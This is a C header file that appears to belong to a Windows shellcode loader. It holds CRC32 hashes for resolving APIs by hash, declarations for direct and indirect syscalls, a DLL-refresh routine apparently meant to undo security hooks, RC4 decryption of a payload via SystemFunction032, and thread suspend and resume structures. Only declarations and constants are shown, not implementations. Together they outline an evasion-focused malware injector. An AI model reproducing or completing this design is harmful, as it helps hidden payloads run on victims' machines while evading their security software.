#pragma once
#include <Windows.h>
#include "typedefs.h"

#define KEY_SIZE 16
#define HINT_BYTE 0x61

#define SEED        0xEDB88320
#define RANGE       255
#define UP			32
#define DOWN		-32

#define NtAllocateVirtualMemory_CRC32	0xE0762FEB
#define NtProtectVirtualMemory_CRC32	0x5C2D1A97
#define NtCreateThreadEx_CRC32			0x2073465A
#define NtWaitForSingleObject_CRC32		0xDD554681
#define NtOpenSection_CRC32      0x709DE3CC
#define NtCreateSection_CRC32    0x9EEE4B80
#define NtMapViewOfSection_CRC32         0xA4163EBC
#define NtUnmapViewOfSection_CRC32       0x90483FF6
#define NtOpenThread_CRC32       0xB7A26D79
#define NtSuspendThread_CRC32    0xB19AB602
#define NtResumeThread_CRC32     0x6273B572
#define NtClose_CRC32    0x0D09C750
#define LdrLoadDll_CRC32        0x183679F2

#define CreateToolhelp32Snapshot_CRC32   0xC1F3B876
#define Thread32First_CRC32      0x238B3114
#define Thread32Next_CRC32       0xF5197707
#define SystemFunction032_CRC32         0x9874186F

#define win32udll_CRC32          0x1C630B12
#define WIN32UDLL_CRC32          0x270D2BDA

#define NTDLLDLL_CRC32  0x6030EF91
#define KERNEL32DLL_CRC32        0x998B531E

UINT32   _crc32h(PCHAR message);
SIZE_T	 _CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
SIZE_T   _StrlenA(LPCSTR String);
SIZE_T   _StrlenW(LPCWSTR String);
UINT32   _CopyDotStr(PCHAR String);
VOID	 _RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
PVOID	 _memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length);
WCHAR*   _strcpy(WCHAR* dest, CONST WCHAR* src);
WCHAR*   _strcat(WCHAR* dest, CONST WCHAR* src);

#define HASH(API) _crc32h((PCHAR)API)
#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))

PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);

HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
HMODULE LoadLibraryH(LPSTR DllName);

BOOL IniDirectCalls();
BOOL IniIndirectSyscalls();
BOOL RefreshAllDlls();

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);

typedef struct _NT_SYSCALL
{
	DWORD dwSSn;
	DWORD dwSyscallHash;
	PVOID pSyscallAddress;
	PVOID pSyscallInstAddress;

}NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTDLL_CONFIG
{
	PDWORD      pdwArrayOfAddresses;
	PDWORD      pdwArrayOfNames;
	PWORD       pwArrayOfOrdinals;
	DWORD       dwNumberOfNames;
	ULONG_PTR   uModule;

}NTDLL_CONFIG, * PNTDLL_CONFIG;

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;
	NT_SYSCALL  NtOpenSection;
	NT_SYSCALL  NtCreateSection;
	NT_SYSCALL  NtMapViewOfSection;
	NT_SYSCALL  NtUnmapViewOfSection;
	NT_SYSCALL  NtOpenThread;
	NT_SYSCALL  NtSuspendThread;
	NT_SYSCALL  NtResumeThread;
	NT_SYSCALL  NtClose;

}NTAPI_FUNC, * PNTAPI_FUNC;

typedef struct _DIRECT_CALLS {

	fnCreateToolhelp32Snapshot	pCreateToolhelp32Snapshot;
	fnThread32First				pThread32First;
	fnThread32Next				pThread32Next;

}WINAPI_FUNC, * PWINAPI_FUNC;

typedef enum THREADS {
	SUSPEND_THREADS,
	RESUME_THREADS
};